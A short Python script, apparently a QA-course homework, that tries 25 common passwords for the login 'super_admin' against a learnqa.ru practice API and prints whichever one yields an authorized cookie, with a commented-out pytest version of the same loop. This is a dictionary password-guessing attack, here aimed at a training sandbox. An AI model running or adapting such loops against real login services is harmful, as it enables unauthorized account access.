import pytest
import requests


URL_GET_PASSWORD = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
URL_AUTHORIZED = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'


passwords = [
    "123456",
    "123456789",
    "qwerty",
    "password",
    "1234567",
    "12345678",
    "12345",
    "iloveyou",
    "111111",
    "123123",
    "abc123",
    "qwerty123",
    "1q2w3e4r",
    "admin",
    "qwertyuiop",
    "654321",
    "555555",
    "lovely",
    "7777777",
    "welcome",
    "888888",
    "princess",
    "dragon",
    "password1",
    "123qwe"
]


for every_pass in passwords:
    params = {
        'login': 'super_admin',
        'password' : every_pass
    }
    response = requests.post(url=URL_GET_PASSWORD, data=params)
    cookie = response.cookies.get('auth_cookie')


    cookies = {
        'auth_cookie' : cookie
    }
    response = requests.post(url=URL_AUTHORIZED, cookies=cookies)
    if response.text == 'You are authorized':
        print(response.text)
        print(every_pass)


# @pytest.mark.parametrize(
#     'password',[ "123456",
#     "123456789",
#     "qwerty",
#     "password",
#     "1234567",
#     "12345678",
#     "12345",
#     "iloveyou",
#     "111111",
#     "123123",
#     "abc123",
#     "qwerty123",
#     "1q2w3e4r",
#     "admin",
#     "qwertyuiop",
#     "654321",
#     "555555",
#     "lovely",
#     "7777777",
#     "welcome",
#     "888888",
#     "princess",
#     "dragon",
#     "password1",
#     "123qwe"]
# )
#
#
# def test_correct_login(password):
#     params = {
#         'login': 'super_admin',
#         'password' : password
#     }
#     response = requests.post(url=URL_GET_PASSWORD, data=params)
#     cookie = response.cookies.get('auth_cookie')
#
#
#     cookies = {
#         'auth_cookie' : cookie
#     }
#     response = requests.post(url=URL_AUTHORIZED, cookies=cookies)
#     assert response.text == 'You are authorized'